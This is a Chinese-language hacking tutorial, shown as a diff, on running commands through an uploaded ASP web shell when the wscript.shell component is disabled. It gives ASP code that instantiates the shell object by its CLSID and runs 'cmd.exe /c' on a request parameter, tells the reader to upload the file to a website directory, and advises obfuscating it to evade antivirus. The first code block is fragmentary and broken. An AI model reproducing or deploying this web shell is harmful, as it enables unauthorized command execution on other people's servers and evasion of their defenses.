@@ -1,0 +1,42 @@
+可能有很多人，看到关闭了wscript.shell,就感觉没提权的希望了。就会放弃。
+一般当闭上面组件时，你上传cmd.exe到上面去是运行不了命令的。运行时会说出错。
+要想让运行命令可以试试这种方法，成功率为五五之数。
+把下面代码复制：
+<%
+end if
+response.write(”")
+On Error Resume Next
+response.write oScriptlhn.exec(”cmd.exe /c” & request(”c”)).stdout.readall
+response.write(”")
+response.write(”")
+response.write(”
+“)
+response.write(”")
+%>
+保存为一个asp文件，然后传到网站目录上去
+运行的时候可能会出现两个问题，第一是运行了为什么运行不了命令，这个你可以试着再上传个cmd.exe然后把路径写入上面代码。
+我用此成功运行过cacls命令。
+第二那就是运行时出错，可能限制某些代码执行
+无wscript.shell组件提权又一个方法
+<object runat=server id=oScriptlhn scope=page 
+classid=”clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8″></object>
+<%if err then%> 
+<object runat=server id=oScriptlhn scope=page 
+classid=”clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B”></object>
+<% 
+end if 
+response.write(”<textarea readonly cols=80 
+rows=20>”) 
+On Error Resume Next 
+response.write 
+oScriptlhn.exec(”cmd.exe /c” & request(”c”)).stdout.readall
+response.write(”</textarea>”) 
+response.write(”<form 
+method=’post’>”) 
+response.write(”<input type=text name=’c' 
+size=60><br>”) 
+response.write(”<input type=submit 
+value=’执行’></form>”) 
+%>
+保存为ASP，此代码可能被杀，请注意免杀。
+原理：有些人把wscript.shell改名了,但是clsid没有变，所以调用这个clsid就等于调用ws组建
